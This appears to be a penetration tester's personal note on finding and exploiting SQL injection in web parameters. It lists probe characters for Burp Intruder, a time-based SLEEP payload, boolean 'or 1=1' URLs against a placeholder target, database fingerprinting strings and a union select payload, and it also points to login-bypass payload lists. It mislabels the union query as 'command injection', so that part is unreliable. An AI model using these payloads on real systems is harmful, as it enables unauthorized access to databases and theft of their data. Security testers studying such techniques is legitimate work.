#### Detection
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection
```

Try the following characters manually or in Burp Intruder where ever you see a parameter:
```
'
%27
"
%22
#
%23
,
%2C
;
%3B
)
' -- - 
%27 -- - 
" -- - 
%22 -- - 
# -- - 
%23 -- - 
; -- - 
%3B -- - 
) -- - 
```

![[Pasted image 20220712133826.png]]

![[Pasted image 20220712133729.png]]

Notice how only the 18th payload has the same length as the baseline.  Meaning we should be able to manually load that payload `) -- - ` and the page would load correctly.

Test further with sleep:
```sql
&job=1)(SELECT * FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434 -- -
```

#### Boolean Based Detection
Original URL:
```
http://$TARGET/view.php?id=1141
```

Quick injection test:
```
http://$TARGET/view.php?id=1141'
```

Same results if we change the parameter to something non existent. 
```
http://$TARGET/view.php?id=9999
```


Testing for Boolean logic (True statement):
```
http://$TARGET/view.php?id=9999' or '1'='1
```
Page loads correctly!

Testing for Boolean logic (False statement):
```
http://$TARGET/view.php?id=9999' or '1'='2
```
Page does not load correctly!

#### Database Detection
MySQL MSSQL MariaDB testing:
```
'||(SELECT '')||'
```

Oracle testing:
```
'||(SELECT '' FROM dual)||'
```

If the page loads correctly, that should mean you found an injection point.

#### Union command injection
All we have to do here is utilize union for command injection:
```
) union select 'whoami' -- - 
```

![[Pasted image 20220712134347.png]]

#### SQL Login bypass

Use Intruder (Battering ram) + PayloadAllTheThings:

#### MySql
[[1.2_MySQL]]

#### MariaDB
[[1.3_MariaDB]]

#### OracleDB
[[1.4_OracleDB]]

#### MSSQL
[[1.5_MSSQLDB]]

#### MongoDB
[[Port 27017 - MongoDB ~]]


